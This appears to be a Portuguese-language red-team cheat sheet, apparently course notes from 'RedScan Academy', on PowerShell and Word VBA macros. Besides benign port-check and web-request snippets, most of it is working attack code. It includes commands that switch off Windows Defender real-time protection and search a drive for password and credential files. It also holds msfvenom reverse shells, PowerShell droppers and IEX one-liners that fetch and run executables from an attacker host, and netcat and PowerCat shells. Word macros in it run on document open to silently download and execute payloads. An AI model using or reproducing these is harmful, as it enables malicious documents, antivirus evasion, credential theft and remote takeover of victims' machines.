# Word VBA Macro

## Comandos Básicos
### Habilitar a execução de Scripts no PowerShell
```
Set-ExecutionPolicy Unrestricted
```

### Laços de repetição no PowerShell
```
foreach ($ip in 1..10) {echo "192.168.2.$ip"}
```

### Filtrando o resultado do ping
Realizando o ping uma única vez
```
ping 192.168.2.1 -n 1
```
Filtrando pelo resultado de retorno
```
ping 192.168.2.1 -n 1 | Select-String "bytes=32"
```
Criando uma variável para armazenar o resultado do comando
```
$res = ping 192.168.2.1 -n 1 | Select-String "bytes=32"
```
Cortando o resultado com o endereço de IP somente
```
$res.Line.Split('')[2]
```
Removendo os ":" do final da resposta para deixar somente o endereço de IP
```
$res.Line.Split('')[2] -replace ":",""
```
Identificando porta 80 aberta com PowerShell
```
Test-NetConnection 192.168.2.1 -Port 80
```
Identificando porta 80 aberta com PowerShell com saída simplificada
```
Test-NetConnection 192.168.2.1 -Port 80 -WarningAction SilentlyContinue -InformationLevel Quiet
```
Verificando de a porta está aberta ou fechada
```
if (Test-NetConnection 192.168.2.1 -Port 80 -WarningAction SilentlyContinue -InformationLevel Quiet) {echo "Port Opened"} else {echo "Port Closed"}
```
Interagindo com serviços Web utilizando o PowerShell
```
Invoke-WebRequest scanme.org
```
Salvando o resultado
```
Invoke-WebRequest scanme.org -OutFile scanme.txt
```
Analisando o Head
```
Invoke-WebRequest scanme.org -Method Head
```
Identificando os métodos aceitos
```
Invoke-WebRequest scanme.org -Method Options
```
Status Code da página
```
(Invoke-WebRequest scanme.org).statuscode
```
Obtendo Links da página
```
(Invoke-WebRequest scanme.org).links
```
Filtrando pelos links apenas
```
(Invoke-WebRequest scanme.org).links.href
```
Removendo o que não for link
```
(Invoke-WebRequest scanme.org).links.href | Select-String http
```
Inspeção dos headers
```
(Invoke-WebRequest scanme.org).headers
```
Coletando informação da tecnologia do servidor
```
(Invoke-WebRequest scanme.org).headers.Server
```

### Desabilitar Windows Defender Real Time
```
Set-MpPreference -DisableRealtimeMonitoring $true
```
ou
```
Set-MpPreference -DisableRealtimeMonitoring 1
```
### Habilitar Windows Defender Real Time
```
Set-MpPreference -DisableRealtimeMonitoring $false
```
ou
```
Set-MpPreference -DisableRealtimeMonitoring 0
```
### Downloader
```
Invoke-WebRequest -uri https://google.com.br/robots.txt -OutFile robots.txt
```
### Pesquisa por arquivos interessantes
```
gci c:\ -Include *pass*.txt,*pass*.xml,*pass*.ini,*pass*.xlsx,*cred*,*vnc*,*.config*,*accounts* -File -Recurse -EA SilentlyContinue
```
### Históricos de comandos do PowerShell
```
Get-History
```
### Localizar arquivo de registro do histórico de comandos do PowerShell
```
Get-PSReadLineOption
```
```
(Get-PSReadLineOption).HistorySavePath
```
### PowerShell Dropper
### Kali Linux
```
$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.2.118 LPORT=4444 -f exe -o shell.exe
$ nc -nlvp 4444
$ python -m http.server 80
```
### Windows
```
$url = "http://192.168.2.118/shell.exe" 
```
```
$out = "shell.exe" 
```
```
$wc = New-Object Net.WebClient 
```
```
$wc.DownloadFile($url, $out)
```
```
.\shell.exe
```
### PowerShell Dropper OneLiner
```
(New-Object System.Net.WebClient).DownloadFile('http://192.168.2.118/shell.exe', 'shell.exe');.\shell.exe
```
```
(New-Object System.Net.WebClient).DownloadFile('http://192.168.2.118/nc.exe', 'nc.exe');.\nc.exe 192.168.2.118 4444 -e cmd
```
### PowerShell Execute Remote Script by IEX - powershell "IEX(New-Object System.Net.WebClient).DownloadString('URL')"
```
powershell "IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/thiagosmith/scripts-powershell/refs/heads/main/info.ps1')"
```
Kali Linux
```
$ cat smith
whoami
```
```
IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.2.118/smith')
```
### PowerShell Dropper OneLine com IEX
Kali Linux
```
$ cat dropper
$url = "http://192.168.2.118/shell.exe"
$out = "shell.exe"
$wc = New-Object Net.WebClient
$wc.DownloadFile($url, $out)
.\shell.exe
```
Windows
```
IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.2.118/dropper')
```
Kali Linux
```
$ cat dropper1
$url = "http://192.168.2.118/nc.exe"
$out = "nc.exe"
$wc = New-Object Net.WebClient
$wc.DownloadFile($url, $out)
.\nc.exe 192.168.2.118 4444 -e cmd
```
Windows
```
IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.2.118/dropper1')
```
### PowerCat com IEX
```
.\nc.exe -nlvp 8000
```
```
powershell.exe -ExecutionPolicy Bypass -noLogo -Command "IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 192.168.2.118 -p 8000 -e cmd"
```
### lnk File with PowerCat
```
powershell.exe -ExecutionPolicy Bypass -noLogo -Command "IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 192.168.2.118 -p 8000 -e cmd"
```
```
powershell.exe -ExecutionPolicy Bypass -noLogo -w hidden -Command "IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 192.168.2.118 -p 8000 -e cmd"
```

## VBA com Powershell em Macros
### Exibir alerta na tela
```
Sub Document_Open()
    RedScan
End Sub
Sub AutoOpen()
    RedScan
End Sub
Sub RedScan()
    MsgBox ("RedScan Academy")
End Sub
```

### Abrir aplicação
```
Sub Document_Open()
    RedScan
End Sub
Sub AutoOpen()
    RedScan
End Sub
Sub RedScan()
    Dim str As String
    str = "calc.exe"
    Shell str, vbHide
End Sub
```

### Abrir o CMD
```
Sub Document_Open()
    RedScan
End Sub
Sub AutoOpen()
    RedScan
End Sub
Sub RedScan()
    Dim str As String
    str = "cmd.exe"
    CreateObject("Wscript.Shell").Run str, 0
End Sub
```

```
Sub Document_Open()
    RedScan
End Sub

Sub AutoOpen()
    RedScan
End Sub

Sub RedScan()
    Dim str As String
    str = "cmd.exe"
    Shell str, vbHide
End Sub
```
### CMD
```
Sub AutoOpen()
  RedScan
End Sub
Sub Document_Open()
  RedScan
End Sub
Sub RedScan()
  CreateObject("Wscript.Shell").Run "cmd"
End Sub
```

### PowerShell
```
Sub AutoOpen()
  RedScan
End Sub
Sub Document_Open()
  RedScan
End Sub
Sub RedScan()
  CreateObject("Wscript.Shell").Run "powershell"
End Sub
```
### Executa um comando com saída na msgbox
```
Sub Document_Open()
    RedScan
End Sub

Sub AutoOpen()
    RedScan
End Sub

Sub RedScan()
    Dim objShell As Object
    Dim objExec As Object
    Dim strOutput As String
    
    Set objShell = CreateObject("WScript.Shell")
    Set objExec = objShell.Exec("cmd /c whoami")
    
    strOutput = objExec.StdOut.ReadAll
    
    MsgBox "Usuário: " & strOutput
End Sub
```

### PowerShell Dropper
```
Sub Document_Open()
    RedScan
End Sub

Sub AutoOpen()
    RedScan
End Sub

Sub RedScan()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.2.118/shell.exe', 'shell.exe')"
    Shell str, vbHide
    Dim exePath As String
    exePath = ActiveDocument.Path & "\" & "shell.exe"
    Wait (2)
    Shell exePath, vbHide

End Sub

Sub Wait(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
End Sub
```

### PowerShell Dropper1
```
Sub Document_Open()
    RedScan
End Sub

Sub AutoOpen()
    RedScan
End Sub

Sub RedScan()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadString('http://192.168.2.118/dropper1')|IEX"
    Shell str, vbHide

End Sub

Sub Wait(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
End Sub
```


### Executa um comando com saída na msgbox
```
Sub Document_Open()
    RedScan
End Sub

Sub AutoOpen()
    RedScan
End Sub

Sub RedScan()
    Dim objShell As Object
    Dim objExec As Object
    Dim strOutput As String
    
    Set objShell = CreateObject("WScript.Shell")
    Set objExec = objShell.Exec("cmd /c whoami")
    
    strOutput = objExec.StdOut.ReadAll
    
    MsgBox "Usuário atual: " & strOutput
End Sub
```

### Executar comando e salvar resposta em arquivo de texto
```
Sub RedScan()
    Dim objShell As Object, objExec As Object, strLine As String
    Dim fso As Object, txtFile As Object
    
    Set objShell = CreateObject("WScript.Shell")
    Set objExec = objShell.Exec("cmd /c systeminfo")
    
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set txtFile = fso.CreateTextFile("C:\Temp\systeminfo.txt", True)
    
    Do Until objExec.StdOut.AtEndOfStream
        strLine = objExec.StdOut.ReadLine
        txtFile.WriteLine strLine
    Loop
    
    txtFile.Close
    MsgBox "Arquivo salvo em C:\Temp\systeminfo.txt"
End Sub
```

















